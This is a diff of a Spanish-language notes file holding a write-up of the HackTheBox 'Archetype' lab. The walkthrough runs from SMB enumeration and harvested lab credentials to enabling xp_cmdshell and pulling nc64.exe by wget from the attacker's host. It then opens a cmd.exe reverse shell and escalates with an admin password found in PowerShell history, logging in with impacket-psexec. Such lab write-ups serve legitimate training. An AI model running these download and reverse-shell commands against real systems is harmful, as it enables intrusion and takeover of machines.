@@ -21,7 +21,7 @@
 	es una herramienta para Windows que automatiza la búsqueda de posibles vectores de **escalada de privilegios**.
 
 7)¿Qué archivo contiene la contraseña del administrador?
-
+	consolehost_history.txt
 
 
 
@@ -45,10 +45,10 @@ nmap -sCV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 10.1
 ![[Archetype5.png]]
 Por el ttl sabemos que es una maquina windows
 *Puertos relevantes:*
-`445` Es de [[smbclient]] y por lo que entiendo, dice que al final de todo en smb-security, nos podemos conectar como usuario guest
+`445` Es de [[smb]] y por lo que entiendo, dice que al final de todo en smb-security, nos podemos conectar como usuario guest
 
-
-# Intrusion a la maquina por [[smbclient]]
+-------
+# [[smb]] Para robar credenciales
 
 ```shell
 smbclient -L 10.129.217.189 -p 445 -N              / Listamos los directorios
@@ -62,6 +62,8 @@ Nos da dos datos relevantes:
 Password=M3g4c0rp123
 User ID=ARCHETYPE/sql_svc
 
+
+-----
 # Nos conectamos a la base de datos con impacket mssqlclient
 
 Nos conectamos con impacket
@@ -74,43 +76,68 @@ Vamos a chequear con el comando `SELECT is_svrolemember('sysadmin')` si somos ad
 ![[Archetype11.png]]
 
 
-#### Ahora activamos el xp_cmdshell ya que estaba desactivado
+#### Ahora activamos el [[xp_cmdshell]] ya que estaba desactivado
 
 [Cheatsheet de comandos mssql](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
-Vamos a activar el xp_cmdshell por que por defecto viene desactivado
+Vamos a activar el [[xp_cmdshell]] por que por defecto viene desactivado
 
 ```mssql
-EXEC sp_configure 'show advanced options', 1; — priv  
-RECONFIGURE; — priv  
-EXEC sp_configure 'xp_cmdshell', 1; — priv  
-RECONFIGURE; — priv
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
 ```
 
 Ahora hacemos la prueba con `xp_cmdshell "whoami"` para ver si da output
 ![[Archetype12.png]]
-Y como podemos ver responde que somos archetype/sql_svc
+Y como podemos ver responde que somos archetype/sql_svc. Asi que ya confirmamos que esta activado el xp_cmdshell
 
 
 
+---------
 
 
-https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------
+# [[Reverse shell]] para la intrusion
+#### Para mandar la [[Reverse shell]] vamos a necesitar de [[Netcat]]
 
-xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe
+[Link de netcat para 64bits](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------) Vamos a levantar un server de [[python3 -m http.server]] desde nuestra maquina, para que por wget lo descargue la maquina victima. Y a posteriori vamos a ponernos en escucha con  [[rlwrap nc -lvnp 443]] para la reverseshell
 
-xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.16.16 443"
+```shell
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.16.16/nc64.exe -outfile nc64.exe           / Descargamos el archivo
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.16.16 443"                       / Mandamos la reverseshell
+```
 
 ![[Archetype14.png]]
 ![[Archetype13.png]]
 
-rlwrap nc -lvnp 4444
-![[Archetype16.png]]
+``rlwrap nc -lvnp 443``  Para estar en escucha
+
+![[Imagenes/Archetype16.png]]
+Y una vez dentro, podemos visualizar la primera flag
 
 ![[Archetype15.png]]
-3e7b102e78218e935bf3f4951fec21a3
 
-wget http://10.10.16.16/winPEASx64.exe -outfile winPEASx64.exe
 
-desde la powershell pudimos ejectar el winpeasx64.exe
+
+-------
+# Escalada de privilegios mediante logs de consola
+
+#### Vamos a visualizar los logs de la powershell para ver si hay algun dato critico
+
+Los logs estan en esta ruta ``C:\Users\sql_svc\appdata\roaming\microsoft\windows\powershell\psreadline``
+
+Y al visualizar el log, vemos una contraseña
+![[Archetype16.png]]
+MEGACORP_4dm1n!!
+
+#### Asi que vamos a intentar conectarnos con [[impacket-psexec]] ya que esta el servicio [[smb]]
+
+``impacket-psexec Administrator@10.129.95.187 -port 445``
+![[Archetype17.png]]
+Una vez dentro ya podemos visualizar la flag
+![[Archtype18.png]]
+
+
+--------
 # Creditos
 Writeup Oficial HackTheBox
